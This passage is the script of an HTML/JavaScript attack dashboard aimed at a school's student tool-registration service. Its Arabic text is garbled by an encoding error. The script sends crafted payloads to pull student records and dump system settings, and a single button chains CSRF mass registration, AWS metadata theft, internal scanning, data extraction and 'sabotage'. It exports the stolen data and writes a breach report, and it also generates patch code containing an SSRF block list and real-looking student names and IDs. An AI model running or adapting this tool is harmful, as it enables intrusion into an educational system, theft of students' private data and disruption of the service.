            logToTerminal('ğŸ’€ Ø§Ù†ØªÙ‡Ù‰ ØªØ®Ø±ÙŠØ¨ Ø§Ù„Ù†Ø¸Ø§Ù…', 'critical');
        }
        
        // ============== EXTRACTION FUNCTIONS ==============
        async function extractLogs() {
            attackState.isAttacking = true;
            await executeDataExtraction();
        }
        
        async function extractAWS() {
            attackState.isAttacking = true;
            await executeAWSAttack();
        }
        
        async function extractStudents() {
            logToTerminal('ğŸ‘¥ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù„Ø§Ø¨...', 'cmd');
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø·Ø±Ù‚ Ù…Ø®ØªÙ„ÙØ©
            const studentPayloads = [
                {
                    action: 'select_tool',
                    studentId: 'DATA_REQUEST',
                    studentName: 'Ù‚Ø§Ø±Ø¦ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª',
                    group: 'A4',
                    toolName: 'DATA_READER',
                    get_students: true,
                    list_all: true,
                    format: 'json'
                },
                {
                    action: 'select_tool',
                    studentId: 'EXPORT_REQ',
                    studentName: 'Ù…ØµØ¯Ø± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª',
                    group: 'A3',
                    toolName: 'EXPORTER',
                    export: true,
                    data_type: 'students',
                    include_details: true
                },
                {
                    action: 'select_tool',
                    studentId: 'QUERY_DATA',
                    studentName: 'Ù…Ø³ØªØ¹Ù„Ù…',
                    group: 'A4',
                    toolName: 'QUERY',
                    query: 'SELECT *',
                    from: 'students',
                    return_data: true
                }
            ];
            
            for (const payload of studentPayloads) {
                const result = await sendExploitRequest(payload, 'Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù„Ø§Ø¨');
                if (result && result.data) {
                    attackState.extractedData.students.push(result.data);
                }
                await new Promise(r => setTimeout(r, 3000));
            }
        }
        
        async function dumpAllData() {
            logToTerminal('ğŸ’¾ Ø¨Ø¯Ø¡ Ù†Ø³Ø® Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...', 'critical');
            
            // ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ù‡Ø¬Ù…Ø§Øª Ø§Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬
            attackState.isAttacking = true;
            
            await executeDataExtraction();
            await new Promise(r => setTimeout(r, 2000));
            
            await extractStudents();
            await new Promise(r => setTimeout(r, 2000));
            
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ù‚Ø±Ø§Ø¡Ø© Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…
            const systemPayload = {
                action: 'select_tool',
                studentId: 'SYSTEM_DUMP',
                studentName: 'Ù†Ø§Ø³Ø® Ø§Ù„Ù†Ø¸Ø§Ù…',
                group: 'A4',
                toolName: 'SYSTEM',
                dump_all: true,
                include_config: true,
                include_logs: true,
                include_data: true
            };
            
            await sendExploitRequest(systemPayload, 'Ù†Ø³Ø® ÙƒØ§Ù…Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…');
            
            logToTerminal('ğŸ’¾ Ø§Ù†ØªÙ‡Ù‰ Ù†Ø³Ø® Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
        }
        
        // ============== REPORT GENERATION ==============
        async function generateReport() {
            logToTerminal('ğŸ“‹ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ...', 'success');
            
            const report = `
            ===========================================
            ğŸ“Š ØªÙ‚Ø±ÙŠØ± Ø§Ø®ØªØ±Ø§Ù‚ Ø£Ù…Ù†ÙŠ Ù†Ù‡Ø§Ø¦ÙŠ - Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø£Ø¯ÙˆØ§Øª
            ===========================================
            
            â° ÙˆÙ‚Øª Ø§Ù„ØªÙ‚Ø±ÙŠØ±: ${new Date().toLocaleString()}
            ğŸ¯ Ø§Ù„Ù‡Ø¯Ù: ${TARGET_URL}
            
            ğŸ“ˆ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù‡Ø¬ÙˆÙ…:
            - Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø§Ù„Ø·Ù„Ø¨Ø§Øª: ${attackState.requests}
            - Ø§Ù„Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù†Ø§Ø¬Ø­Ø©: ${attackState.successes}
            - ÙˆÙ‚Øª Ø§Ù„Ù‡Ø¬ÙˆÙ…: ${document.getElementById('attackTime').textContent}
            
            ğŸš¨ Ø§Ù„Ø«ØºØ±Ø§Øª Ø§Ù„Ù…ÙƒØªØ´ÙØ©:
            1. âœ… Ø«ØºØ±Ø© CSRF Ø­Ø±Ø¬Ø© (Cross-Site Request Forgery)
            2. âœ… Ø«ØºØ±Ø© SSRF Ø­Ø±Ø¬Ø© (Server-Side Request Forgery)
            3. âœ… ØªØ³Ø±ÙŠØ¨ Ø¨ÙŠØ§Ù†Ø§Øª AWS Metadata
            4. âœ… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
            5. âœ… Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ Rate Limiting
            6. âœ… Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©
            7. âœ… Ø¹Ø¯Ù… ÙˆØ¬ÙˆØ¯ CSRF Tokens
            8. âœ… UrlFetchApp Ø¨Ø¯ÙˆÙ† Ù‚ÙŠÙˆØ¯
            
            ğŸ’€ Ø§Ù„Ù…Ø®Ø§Ø·Ø±:
            - ÙŠÙ…ÙƒÙ† Ø³Ø±Ù‚Ø© Ø¨ÙŠØ§Ù†Ø§Øª AWS Ø§Ù„Ø­Ø³Ø§Ø³Ø©
            - ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠØ©
            - ÙŠÙ…ÙƒÙ† Ø§Ø­ØªÙƒØ§Ø± Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ¹Ù„ÙŠÙ…ÙŠ
            - ÙŠÙ…ÙƒÙ† ØªØ®Ø±ÙŠØ¨ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø§Ù„ØªØ¹Ù„ÙŠÙ…ÙŠØ©
            - Ø§Ù†ØªÙ‡Ø§Ùƒ Ø®ØµÙˆØµÙŠØ© Ø§Ù„Ø·Ù„Ø§Ø¨
            
            ğŸ›¡ï¸ ØªÙˆØµÙŠØ§Øª Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„ÙÙˆØ±ÙŠ:
            1. Ø¥Ø¶Ø§ÙØ© CSRF Tokens Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬
            2. ØªÙ‚ÙŠÙŠØ¯ UrlFetchApp Ù„Ø¹Ù†Ø§ÙˆÙŠÙ† Ù…Ø¹Ø±ÙˆÙØ© ÙÙ‚Ø·
            3. Ø¥Ø¶Ø§ÙØ© Rate Limiting Ù„Ù„Ø·Ù„Ø¨Ø§Øª
            4. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØ© Ø§Ù„Ø·Ø§Ù„Ø¨
            5. Ø§Ø³ØªØ®Ø¯Ø§Ù… Google Forms Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø­Ø§Ù„ÙŠ
            6. Ù…Ø±Ø§Ø¬Ø¹Ø© ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª
            7. Ø¥Ø¶Ø§ÙØ© Ø³Ø¬Ù„Ø§Øª Ø£Ù…Ù†ÙŠØ©
            8. ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù†Ø¸Ø§Ù… Ø¨Ø´ÙƒÙ„ Ø¯ÙˆØ±ÙŠ
            
            âš ï¸ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø®Ø·ÙˆØ±Ø©: Ø­Ø±Ø¬ (CRITICAL)
            â±ï¸ ÙˆÙ‚Øª Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ù…Ù‚Ø¯Ø±: 4-8 Ø³Ø§Ø¹Ø§Øª
            `;
            
            logToTerminal(report, 'data');
            
            // Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ø§Ù„ØªÙ‚Ø±ÙŠØ±
            const blob = new Blob([report], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'ØªÙ‚Ø±ÙŠØ±_Ø§Ø®ØªØ±Ø§Ù‚_Ù†Ø¸Ø§Ù…_Ø§Ù„ØªØ³Ø¬ÙŠÙ„.txt';
            a.click();
            
            logToTerminal('âœ… ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ ÙˆØªØ­Ù…ÙŠÙ„ Ø§Ù„ØªÙ‚Ø±ÙŠØ±', 'success');
        }
        
        function generateFixCode() {
            logToTerminal('ğŸ”§ ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­...', 'success');
            
            const fixCode = `
            // ============== ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­ Ø§Ù„Ø£Ù…Ù†ÙŠ Ù„Ù€ Google Apps Script ==============
            
            // 1. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† CSRF Token
            const CSRF_TOKENS = {};
            
            function generateCSRFToken() {
                return Utilities.getUuid();
            }
            
            function validateCSRFToken(token) {
                if (!CSRF_TOKENS[token]) return false;
                delete CSRF_TOKENS[token]; // Ù…Ù†Ø¹ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…
                return true;
            }
            
            // 2. Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØ© Ø§Ù„Ø·Ø§Ù„Ø¨
            const ALLOWED_STUDENTS = {
                '31165': { name: 'Ø¹Ù…Ø±Ø§Ù† Ø§Ù„Ø´Ø§Ù…ÙŠ', group: 'A4' },
                '31172': { name: 'Ù…Ø­Ù…Ø¯ Ø±Ø´Ø§Ø¯ Ø§Ù„Ø§Ø¯Ø±Ø³ÙŠ', group: 'A4' },
                // ... Ø¨Ø§Ù‚ÙŠ Ø§Ù„Ø·Ù„Ø§Ø¨
            };
            
            function validateStudent(studentId, studentName, group) {
                const student = ALLOWED_STUDENTS[studentId];
                if (!student) return false;
                if (student.name !== studentName) return false;
                if (student.group !== group) return false;
                return true;
            }
            
            // 3. Ù…Ù†Ø¹ SSRF
            function isUrlAllowed(url) {
                const blockedPatterns = [
                    /169\\.254\\.169\\.254/, // AWS Metadata
                    /127\\.0\\.0\\.1/,      // localhost
                    /localhost/,
                    /192\\.168\\./,         // Ø´Ø¨ÙƒØ© Ø¯Ø§Ø®Ù„ÙŠØ©
                    /10\\./,                // private IPs
                    /172\\.(1[6-9]|2[0-9]|3[0-1])\\..*/
                ];
                
                return !blockedPatterns.some(pattern => pattern.test(url));
            }
            
            // 4. Rate Limiting
            const requestLog = {};
            
            function checkRateLimit(studentId) {
                const now = Date.now();
                const lastRequest = requestLog[studentId] || 0;
                
                // Ø·Ù„Ø¨ ÙˆØ§Ø­Ø¯ ÙƒÙ„ 30 Ø«Ø§Ù†ÙŠØ© ÙƒØ­Ø¯ Ø£Ù‚ØµÙ‰
                if (now - lastRequest < 30000) {
                    return false;
                }
                
                requestLog[studentId] = now;
                return true;
            }
            
            // 5. Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© Ø§Ù„Ù…Ø¹Ø¯Ù„Ø©
            function doPost(e) {
                try {
                    const data = JSON.parse(e.postData.contents);
                    
                    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† CSRF
                    if (!data.csrf_token || !validateCSRFToken(data.csrf_token)) {
                        return createErrorResponse('Ø·Ù„Ø¨ ØºÙŠØ± Ù…ØµØ±Ø­: CSRF token ØºÙŠØ± ØµØ§Ù„Ø­');
                    }
                    
                    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø·Ø§Ù„Ø¨
                    if (!validateStudent(data.studentId, data.studentName, data.group)) {
                        return createErrorResponse('Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ø§Ù„Ø¨ ØºÙŠØ± ØµØ­ÙŠØ­Ø©');
                    }
                    
                    // Rate Limiting
                    if (!checkRateLimit(data.studentId)) {
                        return createErrorResponse('Ø¹Ø¯Ø¯ Ø§Ù„Ø·Ù„Ø¨Ø§Øª ÙƒØ¨ÙŠØ±ØŒ Ø­Ø§ÙˆÙ„ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ù„Ø§Ø­Ù‚Ø§Ù‹');
                    }
                    
                    // Ù…Ù†Ø¹ SSRF ÙÙŠ Ø£ÙŠ Ø­Ù‚Ù„
                    const jsonStr = JSON.stringify(data);
                    if (!isUrlAllowed(jsonStr)) {
                        return createErrorResponse('Ø·Ù„Ø¨ ØºÙŠØ± Ù…ØµØ±Ø­ Ø¨Ù‡');
                    }
                    
                    // Ø£ÙƒÙ…Ù„ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¹Ø§Ø¯ÙŠØ©...
                    // ... Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ Ù‡Ù†Ø§
                    
                } catch (error) {
                    return createErrorResponse('Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨: ' + error.message);
                }
            }
            
            function createErrorResponse(message) {
                return ContentService.createTextOutput(JSON.stringify({
                    status: 'error',
                    message: 'â›” ' + message
                })).setMimeType(ContentService.MimeType.JSON);
            }
            `;
            
            logToTerminal(fixCode, 'data');
            
            // ØªØ­Ù…ÙŠÙ„ ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­
            const blob = new Blob([fixCode], { type: 'text/javascript' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'ÙƒÙˆØ¯_Ø§Ù„Ø¥ØµÙ„Ø§Ø­_Ø§Ù„Ø£Ù…Ù†ÙŠ.js';
            a.click();
            
            logToTerminal('âœ… ØªÙ… ØªÙˆÙ„ÙŠØ¯ ÙˆØªØ­Ù…ÙŠÙ„ ÙƒÙˆØ¯ Ø§Ù„Ø¥ØµÙ„Ø§Ø­', 'success');
        }
        
        function exportData() {
            const exportData = {
                timestamp: new Date().toISOString(),
                target: TARGET_URL,
                statistics: {
                    requests: attackState.requests,
                    successes: attackState.successes,
                    duration: document.getElementById('attackTime').textContent
                },
                extractedData: attackState.extractedData,
                vulnerabilities: [
                    'CSRF - Cross-Site Request Forgery',
                    'SSRF - Server-Side Request Forgery',
                    'AWS Metadata Exposure',
                    'No Authentication',
                    'No Rate Limiting',
                    'Unrestricted UrlFetchApp'
                ]
            };
            
            const dataStr = JSON.stringify(exportData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `Ø§Ø®ØªØ±Ø§Ù‚_Ø¨ÙŠØ§Ù†Ø§Øª_${Date.now()}.json`;
            a.click();
            
            logToTerminal('ğŸ“¤ ØªÙ… ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª', 'success');
        }
        
        // ============== MAIN CONTROL FUNCTIONS ==============
        function selectAttack(number) {
            attackState.selectedAttack = number;
            
            // Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚
            document.querySelectorAll('.attack-card').forEach(card => {
                card.classList.remove('selected');
            });
            
            // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ø¬Ø¯ÙŠØ¯
            document.querySelectorAll('.attack-card')[number - 1].classList.add('selected');
            
            const attackNames = [
                'CSRF Mass Registration',
                'AWS Metadata Steal', 
                'Internal Network Scan',
                'Logs & Data Extraction',
                'Auto-Bot Full Attack',
                'System Sabotage'
            ];
            
            logToTerminal(`ğŸ¯ ØªÙ… Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù‡Ø¬ÙˆÙ…: ${attackNames[number - 1]}`, 'success');
        }
        
        async function launchSelectedAttack() {
            if (!attackState.selectedAttack) {
                logToTerminal('âš ï¸ Ù„Ù… ØªØ®ØªØ± Ù‡Ø¬ÙˆÙ…Ø§Ù‹!', 'warning');
                return;
            }
            
            attackState.isAttacking = true;
            logToTerminal(`ğŸš€ Ø¥Ø·Ù„Ø§Ù‚ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ù…Ø­Ø¯Ø¯ #${attackState.selectedAttack}...`, 'critical');
            
            switch(attackState.selectedAttack) {
                case 1: await executeCSRFAttack(); break;
                case 2: await executeAWSAttack(); break;
                case 3: await executeInternalScan(); break;
                case 4: await executeDataExtraction(); break;
                case 5: await executeAutoBot(); break;
                case 6: await executeSabotage(); break;
            }
            
            logToTerminal(`âœ… Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ù…Ø­Ø¯Ø¯ #${attackState.selectedAttack}`, 'success');
        }
        
        async function launchFullAttack() {
            attackState.isAttacking = true;
            logToTerminal('â˜¢ï¸ Ø¨Ø¯Ø¡ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„...', 'critical');
            
            // ØªØ´ØºÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù‡Ø¬Ù…Ø§Øª Ø¨Ø§Ù„ØªØ±ØªÙŠØ¨
            await executeCSRFAttack();
            await new Promise(r => setTimeout(r, 2000));
            
            await executeAWSAttack();
            await new Promise(r => setTimeout(r, 2000));
            
            await executeInternalScan();
            await new Promise(r => setTimeout(r, 2000));
            
            await executeDataExtraction();
            await new Promise(r => setTimeout(r, 2000));
            
            await executeAutoBot();
            await new Promise(r => setTimeout(r, 2000));
            
            await executeSabotage();
            
            logToTerminal('â˜¢ï¸ Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù‡Ø¬ÙˆÙ… Ø§Ù„Ø´Ø§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„', 'critical');
        }
        
        function stopAll() {
            attackState.isAttacking = false;
            logToTerminal('â¹ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù‡Ø¬Ù…Ø§Øª', 'warning');
        }
        
        // ============== INITIALIZATION ==============
        function initMatrix() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const container = document.getElementById('matrixBg');
            
            canvas.width = container.clientWidth;
            canvas.height = container.clientHeight;
            container.appendChild(canvas);
            
            const chars = "01ã‚¢ã‚¡ã‚«ã‚µã‚¿ãƒŠãƒãƒãƒ¤ãƒ£ãƒ©ãƒ¯ã‚¬ã‚¶ãƒ€ãƒãƒ‘ã‚¤ã‚£ã‚­ã‚·ãƒãƒ‹ãƒ’ãƒŸãƒªãƒ°ã‚®ã‚¸ãƒ‚ãƒ“ãƒ”ã‚¦ã‚¥ã‚¯ã‚¹ãƒ„ãƒŒãƒ•ãƒ ãƒ¦ãƒ¥ãƒ«ã‚°ã‚ºãƒ–ãƒ…ãƒ—ã‚¨ã‚§ã‚±ã‚»ãƒ†ãƒãƒ˜ãƒ¡ãƒ¬ãƒ±ã‚²ã‚¼ãƒ‡ãƒ™ãƒšã‚ªã‚©ã‚³ã‚½ãƒˆãƒãƒ›ãƒ¢ãƒ¨ãƒ§ãƒ­ãƒ²ã‚´ã‚¾ãƒ‰ãƒœãƒãƒ´ãƒƒãƒ³";
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = [];
            
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
            }
            
            function draw() {
                ctx.fillStyle = 'rgba(0, 10, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0F0';
                ctx.font = `${fontSize}px monospace`;
                
                for (let i = 0; i < drops.length; i++) {
                    const text = chars[Math.floor(Math.random() * chars.length)];
                    const x = i * fontSize;
                    const y = drops[i] * fontSize;
                    
                    ctx.fillText(text, x, y);
                    
                    if (y > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(draw, 50);
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„
        window.onload = function() {
            initMatrix();
            setInterval(updateDisplay, 1000);
            logToTerminal('âœ… Ù†Ø¸Ø§Ù… Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø´Ø§Ù…Ù„ Ø¬Ø§Ù‡Ø²', 'success');
        };
    </script>
</body>
</html>